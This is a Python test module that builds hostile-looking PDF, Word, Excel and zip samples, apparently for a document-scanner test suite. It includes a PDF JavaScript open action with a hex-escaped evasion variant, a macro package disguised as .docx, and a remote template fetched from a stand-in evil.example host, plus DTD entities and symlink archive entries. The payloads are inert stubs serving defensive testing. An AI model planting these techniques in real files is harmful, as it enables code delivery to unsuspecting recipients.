"""Sample document generators for tests.

* :func:`build_pdf` - a tiny but valid PDF writer (correct xref offsets, direct or indirect
  ``/Length``) with hooks to inject catalog/trailer entries, extra objects, binary streams
  and compressed object streams (``/ObjStm``).
* :func:`build_docx` / :func:`build_xlsx` - real documents via python-docx / openpyxl.
* :func:`rewrite_zip` and the ``docx_*``/``xlsx_*`` helpers - inject macros, external
  relationships, DDE fields... into an otherwise valid OOXML package.
* :func:`raw_zip` / :func:`set_zip_flag` - hand-made archives for archive-safety tests.
"""

from __future__ import annotations

import io
import struct
import zipfile
import zlib
from collections.abc import Iterable, Sequence

MIB = 1024 * 1024

W_NS = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"
REL_NS = "http://schemas.openxmlformats.org/package/2006/relationships"
OFFICE_REL = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
MACRO_DOCX_MAIN = "application/vnd.ms-word.document.macroEnabled.main+xml"
DOCX_MAIN = "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"


# --------------------------------------------------------------------------- #
# PDF
# --------------------------------------------------------------------------- #
def _pdf_string(text: str) -> bytes:
    raw = text.encode("latin-1", "replace")
    return raw.replace(b"\\", b"\\\\").replace(b"(", b"\\(").replace(b")", b"\\)")


def build_pdf(
    pages: Sequence[str] = ("Hello world",),
    *,
    catalog_extra: bytes = b"",
    trailer_extra: bytes = b"",
    extra_objects: Sequence[bytes] = (),
    object_stream: Sequence[bytes] | None = None,
    object_stream_dict_extra: bytes = b"/Filter /FlateDecode",
    object_stream_encoder: str = "zlib",
    binary_stream: bytes | None = None,
    indirect_lengths: bool = False,
) -> bytes:
    """Return the bytes of a small PDF with one text page per entry of ``pages``."""
    objects: list[bytes] = []

    def add(body: bytes) -> int:
        objects.append(body)
        return len(objects)

    catalog = add(b"")
    pages_obj = add(b"")
    font = add(b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>")
    page_ids = []
    for text in pages:
        content = b"BT /F1 12 Tf 72 720 Td (" + _pdf_string(text) + b") Tj ET"
        if indirect_lengths:
            length_id = add(str(len(content)).encode())
            content_id = add(
                b"<< /Length %d 0 R >>\nstream\n" % length_id + content + b"\nendstream"
            )
        else:
            content_id = add(
                b"<< /Length %d >>\nstream\n" % len(content) + content + b"\nendstream"
            )
        page_ids.append(
            add(
                b"<< /Type /Page /Parent %d 0 R /MediaBox [0 0 612 792] "
                b"/Resources << /Font << /F1 %d 0 R >> >> /Contents %d 0 R >>"
                % (pages_obj, font, content_id)
            )
        )
    if binary_stream is not None:
        add(
            b"<< /Length %d /Subtype /Image >>\nstream\n" % len(binary_stream)
            + binary_stream
            + b"\nendstream"
        )
    for body in extra_objects:
        add(body)
    if object_stream is not None:
        own_number = len(objects) + 1
        data = b""
        offsets = []
        for body in object_stream:
            offsets.append(len(data))
            data += body + b"\n"
        numbers = [own_number + 1 + i for i in range(len(object_stream))]
        header = b" ".join(b"%d %d" % pair for pair in zip(numbers, offsets, strict=True)) + b"\n"
        payload = header + data
        encoded = (
            zlib.compress(payload) if object_stream_encoder == "zlib" else payload.hex().encode()
        )
        add(
            b"<< /Type /ObjStm /N %d /First %d %s /Length %d >>\nstream\n"
            % (len(object_stream), len(header), object_stream_dict_extra, len(encoded))
            + encoded
            + b"\nendstream"
        )
    objects[catalog - 1] = b"<< /Type /Catalog /Pages %d 0 R %s >>" % (pages_obj, catalog_extra)
    kids = b" ".join(b"%d 0 R" % p for p in page_ids)
    objects[pages_obj - 1] = b"<< /Type /Pages /Kids [%s] /Count %d >>" % (kids, len(page_ids))

    out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
    offsets_table = []
    for number, body in enumerate(objects, 1):
        offsets_table.append(len(out))
        out += b"%d 0 obj\n" % number + body + b"\nendobj\n"
    xref = len(out)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objects) + 1)
    out += b"".join(b"%010d 00000 n \n" % offset for offset in offsets_table)
    out += b"trailer\n<< /Size %d /Root %d 0 R %s >>\n" % (len(objects) + 1, catalog, trailer_extra)
    out += b"startxref\n%d\n%%%%EOF\n" % xref
    return bytes(out)


JS_OPEN_ACTION = b"/OpenAction << /S /JavaScript /JS (app.alert\\(1\\)) >>"
HEX_ESCAPED_JS = b"/OpenAction << /S /J#61vaScript /J#53 (app.alert\\(1\\)) >>"
ENCRYPT_TRAILER = (
    b"/Encrypt << /Filter /Standard /V 1 /R 2 /O (0123456789abcdef0123456789abcdef) "
    b"/U (0123456789abcdef0123456789abcdef) /P -4 >> /ID [<00112233> <00112233>]"
)


# --------------------------------------------------------------------------- #
# OOXML
# --------------------------------------------------------------------------- #
def build_docx(paragraphs: Iterable[str] = ("Hello from a test document.",)) -> bytes:
    import docx

    document = docx.Document()
    document.add_heading("Test document", level=1)
    for text in paragraphs:
        document.add_paragraph(text)
    buffer = io.BytesIO()
    document.save(buffer)
    return buffer.getvalue()


def build_xlsx(rows: Iterable[Sequence[object]] = (("name", "amount"), ("alpha", 1))) -> bytes:
    import openpyxl

    workbook = openpyxl.Workbook()
    sheet = workbook.active
    assert sheet is not None
    for row in rows:
        sheet.append(list(row))
    buffer = io.BytesIO()
    workbook.save(buffer)
    return buffer.getvalue()


def read_part(data: bytes, name: str) -> bytes:
    with zipfile.ZipFile(io.BytesIO(data)) as archive:
        return archive.read(name)


def rewrite_zip(
    data: bytes,
    *,
    replace: dict[str, bytes] | None = None,
    add: dict[str, bytes] | None = None,
    remove: Iterable[str] = (),
) -> bytes:
    """Copy an archive, replacing/adding/removing parts."""
    replace = replace or {}
    removed = set(remove)
    out = io.BytesIO()
    with (
        zipfile.ZipFile(io.BytesIO(data)) as source,
        zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as target,
    ):
        for info in source.infolist():
            if info.filename in removed:
                continue
            body = replace.get(info.filename, source.read(info))
            target.writestr(info.filename, body)
        for name, body in (add or {}).items():
            target.writestr(name, body)
    return out.getvalue()


def docm_disguised_as_docx() -> bytes:
    """A macro-enabled Word package (content type + VBA part) saved with a .docx name."""
    base = build_docx()
    types = read_part(base, "[Content_Types].xml").decode()
    types = types.replace(DOCX_MAIN, MACRO_DOCX_MAIN)
    types = types.replace(
        "</Types>",
        '<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>',
    )
    return rewrite_zip(
        base,
        replace={"[Content_Types].xml": types.encode()},
        add={"word/vbaProject.bin": b"\xd0\xcf\x11\xe0" + b"\x00" * 60},
    )


def docx_with_undeclared_vba() -> bytes:
    """A regular .docx that nevertheless carries a vbaProject.bin part."""
    return rewrite_zip(
        build_docx(), add={"word/vbaProject.bin": b"\xd0\xcf\x11\xe0" + b"\x00" * 60}
    )


def _relationships(*rels: tuple[str, str, str]) -> bytes:
    body = "".join(
        f'<Relationship Id="{rid}" Type="{OFFICE_REL}/{kind}" Target="{target}" '
        'TargetMode="External"/>'
        for rid, kind, target in rels
    )
    return (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        f'<Relationships xmlns="{REL_NS}">{body}</Relationships>'
    ).encode()


def docx_with_remote_template(url: str = "https://templates.evil.example/t.dotm") -> bytes:
    return rewrite_zip(
        build_docx(),
        add={"word/_rels/settings.xml.rels": _relationships(("rIdT", "attachedTemplate", url))},
    )


def docx_with_external_relationship(kind: str, target: str) -> bytes:
    """Add an external relationship to the main document part's relationships."""
    base = build_docx()
    rels = read_part(base, "word/_rels/document.xml.rels").decode()
    rel = (
        f'<Relationship Id="rIdX9" Type="{OFFICE_REL}/{kind}" Target="{target}" '
        'TargetMode="External"/>'
    )
    rels = rels.replace("</Relationships>", rel + "</Relationships>")
    return rewrite_zip(base, replace={"word/_rels/document.xml.rels": rels.encode()})


def docx_with_field(instr_parts: Sequence[str], *, simple: bool = False) -> bytes:
    """Insert a field whose instruction is split across ``instr_parts`` runs."""
    base = build_docx()
    document = read_part(base, "word/document.xml").decode()
    if simple:
        field = f'<w:p><w:fldSimple w:instr="{"".join(instr_parts)}"/></w:p>'
    else:
        runs = "".join(
            f'<w:r><w:instrText xml:space="preserve">{part}</w:instrText></w:r>'
            for part in instr_parts
        )
        field = (
            '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
            f'{runs}<w:r><w:fldChar w:fldCharType="separate"/></w:r>'
            '<w:r><w:t>result</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'
        )
    document = document.replace("<w:sectPr", field + "<w:sectPr", 1)
    return rewrite_zip(base, replace={"word/document.xml": document.encode()})


def docx_with_rels_dtd() -> bytes:
    base = build_docx()
    rels = read_part(base, "word/_rels/document.xml.rels").decode()
    rels = rels.replace("<Relationships", '<!DOCTYPE r [<!ENTITY x "boom">]><Relationships', 1)
    return rewrite_zip(base, replace={"word/_rels/document.xml.rels": rels.encode()})


def xlsx_with_formula(formula: str) -> bytes:
    import openpyxl

    workbook = openpyxl.Workbook()
    sheet = workbook.active
    assert sheet is not None
    sheet["A1"] = "value"
    sheet["B1"] = formula
    buffer = io.BytesIO()
    workbook.save(buffer)
    return buffer.getvalue()


# --------------------------------------------------------------------------- #
# Raw archives
# --------------------------------------------------------------------------- #
MINIMAL_DOCX_TYPES = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    '<Default Extension="xml" ContentType="application/xml"/>'
    f'<Override PartName="/word/document.xml" ContentType="{DOCX_MAIN}"/>'
    "</Types>"
).encode()


def raw_zip(
    entries: Iterable[tuple[str | zipfile.ZipInfo, bytes]],
    *,
    compression: int = zipfile.ZIP_DEFLATED,
    content_types: bool = True,
) -> bytes:
    """An archive with the given entries (plus a minimal docx content-types part)."""
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", compression) as archive:
        if content_types:
            archive.writestr("[Content_Types].xml", MINIMAL_DOCX_TYPES)
        for name, body in entries:
            archive.writestr(name, body)
    return out.getvalue()


def set_zip_flag(data: bytes, entry: str, flag: int) -> bytes:
    """Set a general-purpose flag bit on ``entry`` in both local and central headers."""
    blob = bytearray(data)
    encoded = entry.encode()
    for signature, flag_offset, name_len_offset, name_offset in (
        (b"PK\x03\x04", 6, 26, 30),
        (b"PK\x01\x02", 8, 28, 46),
    ):
        pos = 0
        while (pos := blob.find(signature, pos)) >= 0:
            (name_len,) = struct.unpack_from("<H", blob, pos + name_len_offset)
            if bytes(blob[pos + name_offset : pos + name_offset + name_len]) == encoded:
                (flags,) = struct.unpack_from("<H", blob, pos + flag_offset)
                struct.pack_into("<H", blob, pos + flag_offset, flags | flag)
            pos += 4
    return bytes(blob)


def symlink_entry(name: str) -> zipfile.ZipInfo:
    info = zipfile.ZipInfo(name)
    info.create_system = 3
    info.external_attr = (0o120777 & 0xFFFF) << 16
    return info
